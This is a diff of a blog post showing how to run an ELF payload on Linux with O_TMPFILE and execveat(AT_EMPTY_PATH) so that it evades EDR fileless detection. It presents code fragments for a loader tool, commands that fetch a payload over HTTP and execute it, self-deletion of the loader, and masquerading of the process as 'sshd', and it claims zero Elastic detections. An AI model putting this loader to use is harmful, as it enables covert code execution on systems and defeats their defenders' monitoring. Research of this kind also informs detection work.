@@ -15,39 +15,29 @@ images:
 
 ![imgur](https://i.imgur.com/n4kkDlE.jpeg)
 
-`O_TMPFILE` + `execveat(AT_EMPTY_PATH)` is a way to execute an ELF binary that never touches disk as a named file. The running process shows up as `/tmp/#N (deleted)` in telemetry. No directory entry is ever created, no path ever exists, and the technique works on any kernel since 3.19.
+Hello guys! So today I want to show a way to execute an ELF payload that never touches disk as a named file. No `memfd_create`, no `/memfd:` prefix anywhere in telemetry. The trick is `O_TMPFILE` combined with `execveat(AT_EMPTY_PATH)`, and it works on any kernel since 3.19.
 
-Elastic Security Labs published [FENIX](https://github.com/elastic/fenix) alongside their [fileless execution research](https://www.elastic.co/security-labs/threat-command/memfd-create-linux-fileless-execution), covering 15 techniques across every major backing store. It's the most complete public coverage matrix for this category. This combination isn't in it.
+The issue with `memfd_create` is that it leaves a very specific fingerprint: `process.executable` shows `/memfd:name (deleted)`, the backing device is `00:01` (the kernel's internal anonymous tmpfs), and the syscall number is 319. Elastic, Falco, and basically every modern EDR have signatures for exactly that combination. `O_TMPFILE` takes a completely different path through the kernel and produces none of those artifacts.
 
----
-
-## O_TMPFILE
-
-`O_TMPFILE` is an `open()` flag introduced in Linux 3.11. Instead of passing a filename, you pass a directory. The kernel allocates an inode directly on that filesystem's superblock and returns a file descriptor. No directory entry is ever created. The file is invisible to `ls`, `find`, `inotify`, and `fanotify` from the moment it exists.
+`O_TMPFILE` is an `open()` flag introduced in Linux 3.11. Instead of passing a filename, you pass a directory:
 
 ```c
 int fd = open("/tmp", O_TMPFILE | O_RDWR | O_CLOEXEC, 0700);
 ```
 
-This is plain `open()`, syscall 2. The inode lands on the real `/tmp` filesystem with a real device number, not on the kernel's internal anonymous tmpfs. The resulting artifact in telemetry looks nothing like `memfd_create`.
+That's still plain `open()`, syscall 2. The kernel allocates an inode directly on that filesystem's superblock and returns a file descriptor. No directory entry is ever created. The file never appears in `ls` or `find`, and no creation event fires.
 
-The key is the inode/dentry split. An inode is the kernel's internal representation of a file: data, permissions, timestamps, block addresses. A dentry is the name-to-inode mapping that makes a path like `/tmp/payload` resolvable. `O_TMPFILE` creates the inode but skips `d_alloc()` entirely; no dentry is ever allocated. `inotify` and `fanotify` both hook into dentry operations. Without a dentry, neither system sees the file. No `IN_CREATE` event, no `FAN_CREATE` notification, nothing.
+The reason comes down to the inode/dentry split. An inode is the kernel's internal object for a file: data, permissions, timestamps, block addresses. A dentry is the name-to-inode mapping that makes `/tmp/payload` resolvable. `O_TMPFILE` creates the inode but the resulting dentry is kept unhashed, never inserted into the directory tree. `inotify` and `fanotify` hook creation events through dentry operations, so without a visible dentry neither fires a creation event. No `IN_CREATE`, no `FAN_CREATE`.
 
-Write the payload bytes into the fd:
+The inode lands on the real `/tmp` filesystem with a real device number. This is not a memory trick. `linkat(2)` with `AT_EMPTY_PATH` can materialize the anonymous inode into a named path at any point while you hold the fd. But we never do that.
+
+Once we have the fd, writing the payload is just:
 
 ```c
 write(fd, elf_bytes, elf_size);
 ```
 
-The inode is real and the bytes are real. `O_TMPFILE` is not a memory trick. `linkat(2)` with `AT_EMPTY_PATH` can materialize the anonymous inode into a named path at any point, as long as you hold the fd. The inode gets a dentry and becomes visible. It starts nameless, and nameless is all that matters.
-
-The "fileless" label is not absolute here. What it means is that the executed binary never has a directory entry, so it never has a path. Tools that track files by name, hash on-disk artifacts, or watch for file creation events see nothing, because a directory entry never existed.
-
----
-
-## execveat(AT_EMPTY_PATH)
-
-The kernel refuses to exec a fd that is open for writing; it returns `ETXTBSY`. The fix is to reopen the inode read-only through `/proc/self/fd/` and close the original:
+Now the execution part. The kernel refuses to exec a fd that is open for writing; it returns `ETXTBSY`. The fix is to reopen the inode read-only through `/proc/self/fd/` and close the original:
 
 ```c
 char fdpath[64];
@@ -56,13 +46,13 @@ int ro_fd = open(fdpath, O_RDONLY | O_CLOEXEC);
 close(fd);
 ```
 
-Then execute with `execveat` and `AT_EMPTY_PATH`:
+Then execute with `execveat` and the `AT_EMPTY_PATH` flag:
 
 ```c
 execveat(ro_fd, "", argv, envp, AT_EMPTY_PATH);
 ```
 
-When `execveat` receives `AT_EMPTY_PATH` with an empty path string, it calls `do_execveat_common()` skipping path resolution entirely. The VFS never walks a directory tree, never constructs a pathname, never touches a dentry. It takes the backing file from the fd and loads the ELF directly. No path string is constructed anywhere: not in the syscall arguments, not in exec telemetry, not in process ancestry.
+When `execveat` gets `AT_EMPTY_PATH` with an empty path string it calls `do_execveat_common()` skipping path resolution entirely. The VFS never walks a directory tree, never constructs a pathname, never touches a visible dentry. It takes the backing file from the fd and loads the ELF directly.
 
 What the kernel records for the running process:
 
@@ -70,13 +60,9 @@ What the kernel records for the running process:
 process.executable: /tmp/#220 (deleted)
 ```
 
-The `#` prefix and inode number are how the kernel represents a nameless inode in `/proc`. The inode exists but has no directory entry, so the kernel uses `#<ino>` as its identifier. The `(deleted)` suffix appears for the same reason. Same suffix any process gets when it execs an already-unlinked file.
+The `#` prefix and inode number are how the kernel represents a nameless inode in `/proc`. The `(deleted)` suffix is there for the same reason any unlinked-but-running binary gets it: it's the same suffix a totally legitimate process produces if its binary gets unlinked while running. Nothing specific to fileless execution.
 
----
-
-## The Loader
-
-I built a loader handling three input modes: stdin pipe, HTTP fetch, and local file. The exec path:
+I built this into [Dntry](https://github.com/MatheuZSecurity/Dntry) with three input modes: local file, HTTP fetch, and stdin pipe. The execution path:
 
 ```c
 static void exec_anon(int anon_fd, char *const argv[], char *const envp[],
@@ -98,68 +84,56 @@ static void exec_anon(int anon_fd, char *const argv[], char *const envp[],
 }
 ```
 
-`prctl(PR_SET_NAME)` renames the thread before `execveat` replaces the process image. `unlink` on `/proc/self/exe` wipes the loader from disk before the payload takes over. Nothing remains on disk once execution passes to the payload.
-
-Shared memory paths are not in the candidates list:
+`prctl(PR_SET_NAME)` renames the thread before `execveat` replaces the process image. `readlink("/proc/self/exe")` gives back the real filesystem path the binary was loaded from, and that's what gets unlinked before the payload takes over. The candidate directories skip shared memory paths on purpose:
 
 ```c
-static const char *anon_dirs[] = {
-    "/tmp", "/var/tmp", "/run", NULL
-};
+static const char *anon_dirs[] = { "/tmp", "/var/tmp", "/run", NULL };
 ```
 
-Usage:
+You call it like this:
 
 ```bash
 cat payload.elf | ./dntry stdin python3
-
 ./dntry http http://192.168.1.10:8080/payload python3
-
 ./dntry file ./payload python3
 ```
 
-The third argument becomes `argv[0]` of the exec'd process:
+The spoof name becomes `argv[0]` of the exec'd process and what shows up as `process.name` in telemetry:
 
 ```
 process.name:       python3
 process.executable: /tmp/#220 (deleted)
 ```
 
----
+`prctl(PR_SET_NAME)` before exec only covers the window between the call and exec itself. After `execveat` replaces the process image, the kernel sets comm from the inode name, `#1835068` not `sshd`. `argv[0]` spoofing still works since that passes through exec args, so `process.name` is fine. For `comm` to also match, the payload itself needs to call `prctl(PR_SET_NAME)` at startup.
 
-## Syscall Trace
+Running the loader under strace shows the full chain:
 
-Running the loader under strace shows the syscall chain:
+```bash
+strace -e trace=open,read,write,execveat,prctl,unlink ./dntry http http://192.168.1.10:8080/payload sshd
+```
 
-- `open("/tmp", O_RDWR|O_CLOEXEC|O_TMPFILE, 0700)` -> anonymous inode created, syscall 2
-- `read(0, ...)` / `write(3, ...)` -> payload written to the anon fd
-- `open("/proc/self/fd/3", O_RDONLY|O_CLOEXEC)` -> reopen to clear the write flag
-- `prctl(PR_SET_NAME, "sshd")` -> thread rename before exec
-- `unlink("./dntry")` -> loader removed from disk
-- `execveat(4, "", ["sshd"], ..., AT_EMPTY_PATH)` -> fd executed directly, no path
+- `open("/tmp", O_RDWR|O_CLOEXEC|O_TMPFILE, 0700)` - anonymous inode, syscall 2
+- `read` / `write` loop - payload written to anon fd
+- `open("/proc/self/fd/3", O_RDONLY|O_CLOEXEC)` - reopen to drop the write flag
+- `prctl(PR_SET_NAME, "sshd")` - thread rename before exec
+- `unlink("/home/user/dntry")` - loader gone from disk (absolute path from readlink)
+- `execveat(4, "", ["sshd"], ..., AT_EMPTY_PATH)` - direct fd exec, no path
 
 ![strace output part 1](/img/fileless-strace1.png)
 ![strace output part 2](/img/fileless-strace2.png)
 
-After `execveat` replaces the process image, the kernel sets the process comm from the executable's inode name: `#1835068`, not `sshd`. The `prctl` before exec only covers the window between the call and exec itself. `argv[0]` spoofing still works since that passes through exec args. For the comm field in the exec'd process to match, the payload itself needs to call `prctl(PR_SET_NAME)` at startup.
-
----
-
-## Demo
+The payload runs cleanly:
 
 ![fileless payload running](/img/fileless-terminal.png)
 
+Zero detections in Elastic Security:
+
 ![Elastic Security, 0 fileless detections](/img/fileless-elastic.png)
 
----
+Fileless detection is built around specific `memfd_create` artifacts: the `memfd:` prefix in `process.executable`, device `00:01`, syscall 319. `O_TMPFILE` produces none of them. It goes through the normal `open()` path on a real mounted filesystem, `execveat(AT_EMPTY_PATH)` hands the kernel an fd directly, and no path string is ever constructed anywhere in the chain.
 
-## Why This Works
-
-Fileless detection is built around specific `memfd_create` artifacts: the `memfd:` prefix in `process.executable`, device `00:01`, syscall 319. `O_TMPFILE` produces none of them. It goes through the normal `open()` path on a real mounted filesystem. `execveat(AT_EMPTY_PATH)` hands the kernel an fd number directly, so no path string is ever constructed.
-
-The only remaining signal is the `(deleted)` suffix in `process.executable`. That suffix is indistinguishable from any process that opens a file, unlinks it, and execs it later. Plenty of legitimate software does exactly that.
-
-Detection signatures were written for `memfd_create` specifically, not for the underlying operation. `O_TMPFILE + execveat(AT_EMPTY_PATH)` expresses the same operation through a different path, and none of those signatures apply.
+The `(deleted)` suffix appears on any process whose binary was unlinked while running, so that's not specific to this. The `#N` format in the path is unusual since no legitimate process has an executable at `/tmp/#220`, but that's not what the current memfd signatures key on. Those are written for the `/memfd:` prefix and device `00:01`, and neither is present here. `O_TMPFILE` is one of those flags everybody walks past on the way to `/dev/shm`, which is exactly what makes it useful.
 
 ---
 
